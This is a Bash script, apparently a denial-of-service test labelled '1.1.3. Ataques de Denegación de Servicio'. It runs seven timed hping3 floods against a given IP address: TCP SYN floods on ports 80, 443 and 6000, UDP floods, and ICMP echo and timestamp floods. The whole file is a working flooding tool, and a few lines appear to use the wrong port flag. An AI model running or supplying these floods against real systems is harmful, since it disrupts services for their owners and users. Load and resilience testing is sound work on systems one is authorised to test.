#!/usr/bin/env bash

TEST_NAME="1.1.3. Ataques de Denegación de Servicio"
TEST_VERSION="0.99"

HPING_BIN=`which hping3`

DATE_FORMAT="+%d/%m/%y %H:%M:%S"

TASK_LIFETIME=180
TASK_BREAKTIME=120


function banner () {
	echo "################################################################################"
	echo "# ${TEST_NAME} (${TEST_VERSION})"
	echo "################################################################################"
}

function estimate_time () {
	local life_etime=$(expr $TASK_LIFETIME \* 7)
	local break_etime=$(expr $TASK_BREAKTIME \* 6)
	local etime=$(expr $life_etime + $break_etime)
	etime=$(expr $etime \/ 60)
	echo "Estimated time: ${etime} minutes"
}

function usage () {
	echo "Usage:"
	echo "\t${0} <target_ip>"
}

function write_log () {
	local msg=$1
	local time=`date "$DATE_FORMAT"`
	echo "[${time}] ${msg}"
}

function exec_task () {
	local cmd=$1
	write_log "RUN: ${cmd}"
	$cmd &> /dev/null & 
}

function exec_task_timeout() {
	local cmd=$1
	local timeout=$2
	write_log "TASK START"
	exec_task "$cmd"
	local task_pid=$!
	echo "PID: $task_pid"
	{ sleep $timeout; kill -9 $task_pid; }	
	write_log "TASK END"
}

function run_test () {
	local target_ip=$1
	local base_cmd="${HPING_BIN} ${target_ip}"
	exec_task_timeout "${base_cmd} -p 80 -S --flood" $TASK_LIFETIME
	sleep $TASK_BREAKTIME
	exec_task_timeout "${base_cmd} -p 443 -S --flood" $TASK_LIFETIME
	sleep $TASK_BREAKTIME
	exec_task_timeout "${base_cmd} -P 6000 -S --flood" $TASK_LIFETIME
	sleep $TASK_BREAKTIME 
	exec_task_timeout "${base_cmd} -P 53 --udp --flood" $TASK_LIFETIME
	sleep $TASK_BREAKTIME
	exec_task_timeout "${base_cmd} -P 6000 --udp --flood" $TASK_LIFETIME
	sleep $TASK_BREAKTIME
	exec_task_timeout "${base_cmd} --icmp --icmp-type 8 --icmp-code 0 --flood" $TASK_LIFETIME
	sleep $TASK_BREAKTIME
	exec_task_timeout "${base_cmd} --icmp --icmp-type 13 --icmp-code 0 --flood" $TASK_LIFETIME
}

function main () {
	banner
	if [ $# -lt 1 ]; then
		usage
		exit 1
	else
		target_ip=$1
	fi

	estimate_time

	run_test $target_ip
}

main $1
